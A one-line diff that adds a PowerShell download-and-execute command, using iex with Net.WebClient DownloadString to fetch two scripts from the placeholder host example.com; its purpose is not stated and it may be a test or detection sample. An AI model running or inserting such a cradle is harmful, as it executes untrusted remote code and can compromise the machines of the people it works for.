@@ -1,0 +1,1 @@
+iex "(New-Object Net.WebClient).DownloadString('http://example.com/command1.ps1');(New-Object Net.WebClient).DownloadString('http://example.com/command2.ps1')"
